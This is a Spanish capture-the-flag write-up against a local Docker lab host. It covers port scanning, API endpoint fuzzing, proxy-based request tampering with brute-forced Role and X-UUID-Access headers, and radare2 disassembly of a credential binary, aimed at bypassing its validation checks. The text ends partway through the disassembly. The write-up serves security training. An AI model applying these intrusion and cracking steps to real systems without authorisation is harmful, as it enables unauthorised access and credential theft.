# Enumeracion de Puertos, Servicios y Versiones

```bash
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2 -oN report_nmap
```
![image](https://github.com/user-attachments/assets/33ce0c87-787c-479e-922d-da5ce4c6da78)

Se detectan 2 servicios expuestos, ssh (22) y http (80), tambien se observa una redireccion hacia el dominio `http://cybersec.dl`, agregamos el dominio a nuestro archivo hosts

```bash
echo "172.17.02 cybersec.dl" >> /etc/hosts
```

ahora chequeamos el website

https://github.com/user-attachments/assets/d12733d5-0386-49b3-8212-f0820d67b4fc

intentando acceder al codigo fuente observamos que nos limitan 

![image](https://github.com/user-attachments/assets/d51c537a-93a9-4b81-9b0b-e300098d16c9)

![image](https://github.com/user-attachments/assets/c37ff475-ba27-4281-a4c2-0e7362e73d16)

pero esta limitacion es facil de saltarse desactivando en el navegador el codigo js o con curl..

```bash
curl http://cybersec.dl
```

![image](https://github.com/user-attachments/assets/d4c69010-e9ab-4931-ac9f-3aa212526d29)

inspeccionando el codigo fuente puedo observar el uso de una api que se encarga de generar las credenciales que recomiendan usar en el website

![image](https://github.com/user-attachments/assets/fddd9d32-5771-4486-b1f7-5d0dbfe4bdd6)

![image](https://github.com/user-attachments/assets/da7962dc-04f4-4c69-9289-507563dcc88b)

solo genera las credenciales, sin embargo podemos intentar localizar mas puntos finales con fuzzing

```bash
feroxbuster -u http://cybersec.dl/api/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 200 --random-agent --no-state -d 5
```

![image](https://github.com/user-attachments/assets/006eb65c-ca62-419f-942a-45cbe5c9529b)

conseguimos un punto final mas, asi que lo testeamos

![image](https://github.com/user-attachments/assets/2ed55be0-9649-4d78-80d4-e9b9ee576d28)

esto nos indica que espera un tipo de peticion diferente, asi que interceptare la peticion con `caido` y asi modificarla. Primero configuramos el navegador para que pase
a traves de `caido`

![image](https://github.com/user-attachments/assets/2d0272af-39d7-47ec-a89d-96fc34396c82)

luego abrimos `caido` e interceptamos la peticion

![image](https://github.com/user-attachments/assets/692694a8-f007-46b1-95eb-6c8999988270)

pasamos la peticion de GET a POST 

![image](https://github.com/user-attachments/assets/e35dc18a-8b8e-4133-bb90-d15f82800dc4)

enviamos la peticion y observamos la respuesta en el navegador

![image](https://github.com/user-attachments/assets/274a4e0e-8f5c-49c1-bf57-3221b9c3df2e)

ahora observamos que pide la cabecera `Role` asi que volvemos interceptar la peticion y la mandamos al `automate` para testear los roles y para esto voy a preparar
una wordlist con posibles roles y luego automatizar la prueba con caido

https://github.com/user-attachments/assets/d1055a11-67d7-4a65-ad4b-bf5526b92a91

hemos logrado acceder a informacion de posible interes con el rol administrador, todos los subdominios que aqui consigo los agrego a mi archivo hosts y los testeo

https://github.com/user-attachments/assets/e5aa40fe-b3d1-496f-a265-57688c33bbdf

tenemos 3 subdominios activos, pero en los subdominios `http://mail.cybersec.dl/` & `http://soc_internal_operations.cybersec.dl/` despues de testearlos no tienes vulnerabilidades o informacion de interes
sin embargo el tercer subdominio `http://0internal_down.cybersec.dl/` vemos que indica falta la cabecera `X-UUID-Access` y si recordamos la informaacion extraida de /api/interest
vemos algo que puede estar relacionado con esta cabecera

![image](https://github.com/user-attachments/assets/3ff4768f-051b-48c4-8917-25390bdad67b)

asi que intercecto la peticion con `CAIDO`, le agrego la cabecera `X-UUID-Access` y pasandole los UUID de /api/interest

https://github.com/user-attachments/assets/2592b325-d56d-4be4-9320-d4d036255ed5

obtuvimos acceso a 2 archivos los cuales vamos a descargar

![image](https://github.com/user-attachments/assets/33f276f4-3b64-4320-948c-1e7bf0e832bc)

al parecer el binario `sec2pass` podria contener credenciales pero por lo visto es necesario 2 niveles de verificacion, procedo a testearlo

![image](https://github.com/user-attachments/assets/c1124d55-d8dc-403d-b07b-fce40ad389a2)

siempre nos queda la option de hacer ingenieria inversa al binario, asi que nos ponemos manos a la obra

![image](https://github.com/user-attachments/assets/7ad8e822-d078-45e0-963a-cbb7ffa8d262)

![image](https://github.com/user-attachments/assets/60d8553a-01c8-4833-974e-f6fb194cedb9)

no existe casi cadena en texto plano dentro del binario, existe mucha informacion fragmentada y encriptada, pero 
comprendiendo un poco como funciona el programa, se puede observar 2 validaciones antes de llegar a la funcion `k8j4h3()`.
La estrategia sera crackear el programa para saltarnos las validaciones y obtener las credenciales y para esto el primer enfoque que usare sera llamar a la funcion `k8j4h3()` antes de las validaciones.

### Cracking

Para crackear el programa usaremos `radare2`

```bash
r2 -w sec2pass
```
```bash
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
[0x00002150]> aaa
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze entrypoint (af@ entry0)
INFO: Analyze symbols (af@@@s)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods (af @@ method.*)
INFO: Recovering local variables (afva@@@F)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis
[0x00002150]> s main
[0x00002ccf]> pdf
Do you want to print 366 lines? (y/N) y
            ; ICOD XREF from entry0 @ 0x2164(r)
┌ 1737: int main (int argc, char **argv, char **envp);
│ afv: vars(7:sp[0x10..0x10f8])
│           0x00002ccf      55             push rbp
│           0x00002cd0      4889e5         mov rbp, rsp
│           0x00002cd3      4881ecf010..   sub rsp, 0x10f0
│           0x00002cda      64488b0425..   mov rax, qword fs:[0x28]
│           0x00002ce3      488945f8       mov qword [canary], rax
│           0x00002ce7      31c0           xor eax, eax
│           0x00002ce9      488d95f0ef..   lea rdx, [format]
│           0x00002cf0      b800000000     mov eax, 0
│           0x00002cf5      b980000000     mov ecx, 0x80
│           0x00002cfa      4889d7         mov rdi, rdx
│           0x00002cfd      f348ab         rep stosq qword [rdi], rax
│           0x00002d00      488b150135..   mov rdx, qword [obj.AMLP]   ; [0x6208:8]=0x41dd "ing"
│           0x00002d07      488d85f0ef..   lea rax, [format]
│           0x00002d0e      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002d11      4889c7         mov rdi, rax                ; char *s1
│           0x00002d14      e807f4ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002d19      488b15f034..   mov rdx, qword [obj.PRZS]   ; [0x6210:8]=0x41e1 "res"
│           0x00002d20      488d85f0ef..   lea rax, [format]
│           0x00002d27      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002d2a      4889c7         mov rdi, rax                ; char *s1
│           0x00002d2d      e8eef3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002d32      488b15df34..   mov rdx, qword [obj.ING]    ; [0x6218:8]=0x4027 ; "'@"
│           0x00002d39      488d85f0ef..   lea rax, [format]
│           0x00002d40      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002d43      4889c7         mov rdi, rax                ; char *s1
│           0x00002d46      e8d5f3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002d4b      488d85f0ef..   lea rax, [format]
│           0x00002d52      4889c7         mov rdi, rax                ; const char *s
│           0x00002d55      e806f3ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00002d5a      4889c2         mov rdx, rax
│           0x00002d5d      488d85f0ef..   lea rax, [format]
│           0x00002d64      4801d0         add rax, rdx
│           0x00002d67      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00002d6c      488b15ad34..   mov rdx, qword [obj.PROS]   ; [0x6220:8]=0x41e5 "la"
│           0x00002d73      488d85f0ef..   lea rax, [format]
│           0x00002d7a      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002d7d      4889c7         mov rdi, rax                ; char *s1
│           0x00002d80      e89bf3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002d85      488d85f0ef..   lea rax, [format]
│           0x00002d8c      4889c7         mov rdi, rax                ; const char *s
│           0x00002d8f      e8ccf2ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00002d94      4889c2         mov rdx, rax
│           0x00002d97      488d85f0ef..   lea rax, [format]
│           0x00002d9e      4801d0         add rax, rdx
│           0x00002da1      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00002da6      488b157b34..   mov rdx, qword [obj.TANO]   ; [0x6228:8]=0x41e8 "co"
│           0x00002dad      488d85f0ef..   lea rax, [format]
│           0x00002db4      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002db7      4889c7         mov rdi, rax                ; char *s1
│           0x00002dba      e861f3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002dbf      488b156a34..   mov rdx, qword [obj.CHZ]    ; [0x6230:8]=0x4029 ; ")@"
│           0x00002dc6      488d85f0ef..   lea rax, [format]
│           0x00002dcd      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002dd0      4889c7         mov rdi, rax                ; char *s1
│           0x00002dd3      e848f3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002dd8      488b155934..   mov rdx, qword [obj.PWD]    ; [0x6238:8]=0x41eb "tra"
│           0x00002ddf      488d85f0ef..   lea rax, [format]
│           0x00002de6      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002de9      4889c7         mov rdi, rax                ; char *s1
│           0x00002dec      e82ff3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002df1      488b154834..   mov rdx, qword [obj.CLIK]   ; [0x6240:8]=0x41ef "se.."
│           0x00002df8      488d85f0ef..   lea rax, [format]
│           0x00002dff      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e02      4889c7         mov rdi, rax                ; char *s1
│           0x00002e05      e816f3ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e0a      488b153734..   mov rdx, qword [obj.PARR]   ; [0x6248:8]=0x41f4
│           0x00002e11      488d85f0ef..   lea rax, [format]
│           0x00002e18      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e1b      4889c7         mov rdi, rax                ; char *s1
│           0x00002e1e      e8fdf2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e23      488d95f0f3..   lea rdx, [s]
│           0x00002e2a      b800000000     mov eax, 0
│           0x00002e2f      b980000000     mov ecx, 0x80
│           0x00002e34      4889d7         mov rdi, rdx
│           0x00002e37      f348ab         rep stosq qword [rdi], rax
│           0x00002e3a      488b15e733..   mov rdx, qword [obj.TANO]   ; [0x6228:8]=0x41e8 "co"
│           0x00002e41      488d85f0f3..   lea rax, [s]
│           0x00002e48      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e4b      4889c7         mov rdi, rax                ; char *s1
│           0x00002e4e      e8cdf2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e53      488b15d633..   mov rdx, qword [obj.CHZ]    ; [0x6230:8]=0x4029 ; ")@"
│           0x00002e5a      488d85f0f3..   lea rax, [s]
│           0x00002e61      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e64      4889c7         mov rdi, rax                ; char *s1
│           0x00002e67      e8b4f2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e6c      488b15c533..   mov rdx, qword [obj.PWD]    ; [0x6238:8]=0x41eb "tra"
│           0x00002e73      488d85f0f3..   lea rax, [s]
│           0x00002e7a      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e7d      4889c7         mov rdi, rax                ; char *s1
│           0x00002e80      e89bf2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e85      488b15b433..   mov rdx, qword [obj.CLIK]   ; [0x6240:8]=0x41ef "se.."
│           0x00002e8c      488d85f0f3..   lea rax, [s]
│           0x00002e93      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002e96      4889c7         mov rdi, rax                ; char *s1
│           0x00002e99      e882f2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002e9e      488b151334..   mov rdx, qword [obj.ASMLF]  ; [0x62b8:8]=0x4224 ; "$B"
│           0x00002ea5      488d85f0f3..   lea rax, [s]
│           0x00002eac      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002eaf      4889c7         mov rdi, rax                ; char *s1
│           0x00002eb2      e869f2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002eb7      488d85f0f3..   lea rax, [s]
│           0x00002ebe      4889c7         mov rdi, rax                ; const char *s
│           0x00002ec1      e89af1ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00002ec6      4889c2         mov rdx, rax
│           0x00002ec9      488d85f0f3..   lea rax, [s]
│           0x00002ed0      4801d0         add rax, rdx
│           0x00002ed3      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00002ed8      488b157133..   mov rdx, qword [obj.VNZ]    ; [0x6250:8]=0x41f8
│           0x00002edf      488d85f0f3..   lea rax, [s]
│           0x00002ee6      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002ee9      4889c7         mov rdi, rax                ; char *s1
│           0x00002eec      e82ff2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002ef1      488b156033..   mov rdx, qword [obj.HK]     ; [0x6258:8]=0x41fa str.ncor
│           0x00002ef8      488d85f0f3..   lea rax, [s]
│           0x00002eff      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f02      4889c7         mov rdi, rax                ; char *s1
│           0x00002f05      e816f2ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f0a      488b154f33..   mov rdx, qword [obj.EEUU]   ; [0x6260:8]=0x41ff "re"
│           0x00002f11      488d85f0f3..   lea rax, [s]
│           0x00002f18      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f1b      4889c7         mov rdi, rax                ; char *s1
│           0x00002f1e      e8fdf1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f23      488b153e33..   mov rdx, qword [obj.DNMC]   ; [0x6268:8]=0x4202 "cta"
│           0x00002f2a      488d85f0f3..   lea rax, [s]
│           0x00002f31      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f34      4889c7         mov rdi, rax                ; char *s1
│           0x00002f37      e8e4f1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f3c      488b156533..   mov rdx, qword [obj.ERTG]   ; [0x62a8:8]=0x4220 ; " B"
│           0x00002f43      488d85f0f3..   lea rax, [s]
│           0x00002f4a      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f4d      4889c7         mov rdi, rax                ; char *s1
│           0x00002f50      e8cbf1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f55      488d95f0f7..   lea rdx, [var_810h]
│           0x00002f5c      b800000000     mov eax, 0
│           0x00002f61      b980000000     mov ecx, 0x80
│           0x00002f66      4889d7         mov rdi, rdx
│           0x00002f69      f348ab         rep stosq qword [rdi], rax
│           0x00002f6c      488b159532..   mov rdx, qword [obj.AMLP]   ; [0x6208:8]=0x41dd "ing"
│           0x00002f73      488d85f0f7..   lea rax, [var_810h]
│           0x00002f7a      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f7d      4889c7         mov rdi, rax                ; char *s1
│           0x00002f80      e89bf1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f85      488b158432..   mov rdx, qword [obj.PRZS]   ; [0x6210:8]=0x41e1 "res"
│           0x00002f8c      488d85f0f7..   lea rax, [var_810h]
│           0x00002f93      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002f96      4889c7         mov rdi, rax                ; char *s1
│           0x00002f99      e882f1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002f9e      488b157332..   mov rdx, qword [obj.ING]    ; [0x6218:8]=0x4027 ; "'@"
│           0x00002fa5      488d85f0f7..   lea rax, [var_810h]
│           0x00002fac      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002faf      4889c7         mov rdi, rax                ; char *s1
│           0x00002fb2      e869f1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002fb7      488d85f0f7..   lea rax, [var_810h]
│           0x00002fbe      4889c7         mov rdi, rax                ; const char *s
│           0x00002fc1      e89af0ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00002fc6      4889c2         mov rdx, rax
│           0x00002fc9      488d85f0f7..   lea rax, [var_810h]
│           0x00002fd0      4801d0         add rax, rdx
│           0x00002fd3      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00002fd8      488b15e132..   mov rdx, qword [obj.ASMQ]   ; [0x62c0:8]=0x4226 "el" ; "&B"
│           0x00002fdf      488d85f0f7..   lea rax, [var_810h]
│           0x00002fe6      4889d6         mov rsi, rdx                ; const char *s2
│           0x00002fe9      4889c7         mov rdi, rax                ; char *s1
│           0x00002fec      e82ff1ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00002ff1      488d85f0f7..   lea rax, [var_810h]
│           0x00002ff8      4889c7         mov rdi, rax                ; const char *s
│           0x00002ffb      e860f0ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00003000      4889c2         mov rdx, rax
│           0x00003003      488d85f0f7..   lea rax, [var_810h]
│           0x0000300a      4801d0         add rax, rdx
│           0x0000300d      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00003012      488b155732..   mov rdx, qword [obj.NRG]    ; [0x6270:8]=0x4206 "cod"
│           0x00003019      488d85f0f7..   lea rax, [var_810h]
│           0x00003020      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003023      4889c7         mov rdi, rax                ; char *s1
│           0x00003026      e8f5f0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x0000302b      488b154632..   mov rdx, qword [obj.BRZL]   ; [0x6278:8]=0x420a "igo" ; "\nB"
│           0x00003032      488d85f0f7..   lea rax, [var_810h]
│           0x00003039      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000303c      4889c7         mov rdi, rax                ; char *s1
│           0x0000303f      e8dcf0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003044      488d85f0f7..   lea rax, [var_810h]
│           0x0000304b      4889c7         mov rdi, rax                ; const char *s
│           0x0000304e      e80df0ffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00003053      4889c2         mov rdx, rax
│           0x00003056      488d85f0f7..   lea rax, [var_810h]
│           0x0000305d      4801d0         add rax, rdx
│           0x00003060      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00003065      488b151432..   mov rdx, qword [obj.LAKDF]  ; [0x6280:8]=0x420e "de"
│           0x0000306c      488d85f0f7..   lea rax, [var_810h]
│           0x00003073      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003076      4889c7         mov rdi, rax                ; char *s1
│           0x00003079      e8a2f0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x0000307e      488d85f0f7..   lea rax, [var_810h]
│           0x00003085      4889c7         mov rdi, rax                ; const char *s
│           0x00003088      e8d3efffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x0000308d      4889c2         mov rdx, rax
│           0x00003090      488d85f0f7..   lea rax, [var_810h]
│           0x00003097      4801d0         add rax, rdx
│           0x0000309a      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x0000309f      488b15e231..   mov rdx, qword [obj.WVWVEB] ; [0x6288:8]=0x4211 "seg"
│           0x000030a6      488d85f0f7..   lea rax, [var_810h]
│           0x000030ad      4889d6         mov rsi, rdx                ; const char *s2
│           0x000030b0      4889c7         mov rdi, rax                ; char *s1
│           0x000030b3      e868f0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000030b8      488b15d131..   mov rdx, qword [obj.RBWRTB] ; [0x6290:8]=0x4215 "uri"
│           0x000030bf      488d85f0f7..   lea rax, [var_810h]
│           0x000030c6      4889d6         mov rsi, rdx                ; const char *s2
│           0x000030c9      4889c7         mov rdi, rax                ; char *s1
│           0x000030cc      e84ff0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000030d1      488b15c031..   mov rdx, qword [obj.AEBDV]  ; [0x6298:8]=0x4219 "dad"
│           0x000030d8      488d85f0f7..   lea rax, [var_810h]
│           0x000030df      4889d6         mov rsi, rdx                ; const char *s2
│           0x000030e2      4889c7         mov rdi, rax                ; char *s1
│           0x000030e5      e836f0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000030ea      488b15af31..   mov rdx, qword [obj.QQQQ]   ; [0x62a0:8]=0x421d
│           0x000030f1      488d85f0f7..   lea rax, [var_810h]
│           0x000030f8      4889d6         mov rsi, rdx                ; const char *s2
│           0x000030fb      4889c7         mov rdi, rax                ; char *s1
│           0x000030fe      e81df0ffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003103      488d95f0fb..   lea rdx, [var_410h]
│           0x0000310a      b800000000     mov eax, 0
│           0x0000310f      b980000000     mov ecx, 0x80
│           0x00003114      4889d7         mov rdi, rdx
│           0x00003117      f348ab         rep stosq qword [rdi], rax
│           0x0000311a      488b154f31..   mov rdx, qword [obj.NRG]    ; [0x6270:8]=0x4206 "cod"
│           0x00003121      488d85f0fb..   lea rax, [var_410h]
│           0x00003128      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000312b      4889c7         mov rdi, rax                ; char *s1
│           0x0000312e      e8edefffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003133      488b153e31..   mov rdx, qword [obj.BRZL]   ; [0x6278:8]=0x420a "igo" ; "\nB"
│           0x0000313a      488d85f0fb..   lea rax, [var_410h]
│           0x00003141      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003144      4889c7         mov rdi, rax                ; char *s1
│           0x00003147      e8d4efffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x0000314c      488d85f0fb..   lea rax, [var_410h]
│           0x00003153      4889c7         mov rdi, rax                ; const char *s
│           0x00003156      e805efffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x0000315b      4889c2         mov rdx, rax
│           0x0000315e      488d85f0fb..   lea rax, [var_410h]
│           0x00003165      4801d0         add rax, rdx
│           0x00003168      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x0000316d      488b150c31..   mov rdx, qword [obj.LAKDF]  ; [0x6280:8]=0x420e "de"
│           0x00003174      488d85f0fb..   lea rax, [var_410h]
│           0x0000317b      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000317e      4889c7         mov rdi, rax                ; char *s1
│           0x00003181      e89aefffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003186      488d85f0fb..   lea rax, [var_410h]
│           0x0000318d      4889c7         mov rdi, rax                ; const char *s
│           0x00003190      e8cbeeffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00003195      4889c2         mov rdx, rax
│           0x00003198      488d85f0fb..   lea rax, [var_410h]
│           0x0000319f      4801d0         add rax, rdx
│           0x000031a2      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x000031a7      488b15da30..   mov rdx, qword [obj.WVWVEB] ; [0x6288:8]=0x4211 "seg"
│           0x000031ae      488d85f0fb..   lea rax, [var_410h]
│           0x000031b5      4889d6         mov rsi, rdx                ; const char *s2
│           0x000031b8      4889c7         mov rdi, rax                ; char *s1
│           0x000031bb      e860efffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000031c0      488b15c930..   mov rdx, qword [obj.RBWRTB] ; [0x6290:8]=0x4215 "uri"
│           0x000031c7      488d85f0fb..   lea rax, [var_410h]
│           0x000031ce      4889d6         mov rsi, rdx                ; const char *s2
│           0x000031d1      4889c7         mov rdi, rax                ; char *s1
│           0x000031d4      e847efffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000031d9      488b15b830..   mov rdx, qword [obj.AEBDV]  ; [0x6298:8]=0x4219 "dad"
│           0x000031e0      488d85f0fb..   lea rax, [var_410h]
│           0x000031e7      4889d6         mov rsi, rdx                ; const char *s2
│           0x000031ea      4889c7         mov rdi, rax                ; char *s1
│           0x000031ed      e82eefffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000031f2      488d85f0fb..   lea rax, [var_410h]
│           0x000031f9      4889c7         mov rdi, rax                ; const char *s
│           0x000031fc      e85feeffff     call sym.imp.strlen         ; size_t strlen(const char *s)
│           0x00003201      4889c2         mov rdx, rax
│           0x00003204      488d85f0fb..   lea rax, [var_410h]
│           0x0000320b      4801d0         add rax, rdx
│           0x0000320e      66c7002000     mov word [rax], 0x20        ; [0x20:2]=64 ; "@"
│           0x00003213      488b153630..   mov rdx, qword [obj.VNZ]    ; [0x6250:8]=0x41f8
│           0x0000321a      488d85f0fb..   lea rax, [var_410h]
│           0x00003221      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003224      4889c7         mov rdi, rax                ; char *s1
│           0x00003227      e8f4eeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x0000322c      488b152530..   mov rdx, qword [obj.HK]     ; [0x6258:8]=0x41fa str.ncor
│           0x00003233      488d85f0fb..   lea rax, [var_410h]
│           0x0000323a      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000323d      4889c7         mov rdi, rax                ; char *s1
│           0x00003240      e8dbeeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003245      488b151430..   mov rdx, qword [obj.EEUU]   ; [0x6260:8]=0x41ff "re"
│           0x0000324c      488d85f0fb..   lea rax, [var_410h]
│           0x00003253      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003256      4889c7         mov rdi, rax                ; char *s1
│           0x00003259      e8c2eeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x0000325e      488b156330..   mov rdx, qword [obj.ASMQXZ] ; [0x62c8:8]=0x4229 ; ")B"
│           0x00003265      488d85f0fb..   lea rax, [var_410h]
│           0x0000326c      4889d6         mov rsi, rdx                ; const char *s2
│           0x0000326f      4889c7         mov rdi, rax                ; char *s1
│           0x00003272      e8a9eeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003277      488b153230..   mov rdx, qword [obj.POIKJ]  ; [0x62b0:8]=0x4222 ; "\"B"
│           0x0000327e      488d85f0fb..   lea rax, [var_410h]
│           0x00003285      4889d6         mov rsi, rdx                ; const char *s2
│           0x00003288      4889c7         mov rdi, rax                ; char *s1
│           0x0000328b      e890eeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x00003290      488b151130..   mov rdx, qword [obj.ERTG]   ; [0x62a8:8]=0x4220 ; " B"
│           0x00003297      488d85f0fb..   lea rax, [var_410h]
│           0x0000329e      4889d6         mov rsi, rdx                ; const char *s2
│           0x000032a1      4889c7         mov rdi, rax                ; char *s1
│           0x000032a4      e877eeffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
│           0x000032a9      b800000000     mov eax, 0
│           0x000032ae      e848f3ffff     call sym.fn2
│           0x000032b3      488d85f0ef..   lea rax, [format]
│           0x000032ba      4889c7         mov rdi, rax                ; const char *format
│           0x000032bd      b800000000     mov eax, 0
│           0x000032c2      e869edffff     call sym.imp.printf         ; int printf(const char *format)
│           0x000032c7      488d8510ef..   lea rax, [var_10f0h]
│           0x000032ce      4889c6         mov rsi, rax
│           0x000032d1      488d05550f..   lea rax, [0x0000422d]       ; "%s"
│           0x000032d8      4889c7         mov rdi, rax                ; const char *format
│           0x000032db      b800000000     mov eax, 0
│           0x000032e0      e8dbedffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x000032e5      488d8510ef..   lea rax, [var_10f0h]
│           0x000032ec      4889c7         mov rdi, rax                ; char *arg1
│           0x000032ef      e85ff5ffff     call sym.b6v4c8
│           0x000032f4      85c0           test eax, eax
│       ┌─< 0x000032f6      751b           jne 0x3313
│       │   0x000032f8      488d85f0f3..   lea rax, [s]
│       │   0x000032ff      4889c7         mov rdi, rax                ; const char *format
│       │   0x00003302      b800000000     mov eax, 0
│       │   0x00003307      e824edffff     call sym.imp.printf         ; int printf(const char *format)
│       │   0x0000330c      b801000000     mov eax, 1
│      ┌──< 0x00003311      eb6f           jmp 0x3382
│      ││   ; CODE XREF from main @ 0x32f6(x)
│      │└─> 0x00003313      488d85f0f7..   lea rax, [var_810h]
│      │    0x0000331a      4889c7         mov rdi, rax                ; const char *format
│      │    0x0000331d      b800000000     mov eax, 0
│      │    0x00003322      e809edffff     call sym.imp.printf         ; int printf(const char *format)
│      │    0x00003327      488d8580ef..   lea rax, [var_1080h]
│      │    0x0000332e      4889c6         mov rsi, rax
│      │    0x00003331      488d05f50e..   lea rax, [0x0000422d]       ; "%s"
│      │    0x00003338      4889c7         mov rdi, rax                ; const char *format
│      │    0x0000333b      b800000000     mov eax, 0
│      │    0x00003340      e87bedffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│      │    0x00003345      488d8580ef..   lea rax, [var_1080h]
│      │    0x0000334c      4889c7         mov rdi, rax                ; char *arg1
│      │    0x0000334f      e88af5ffff     call sym.x1w5z9
│      │    0x00003354      85c0           test eax, eax
│      │┌─< 0x00003356      751b           jne 0x3373
│      ││   0x00003358      488d85f0fb..   lea rax, [var_410h]
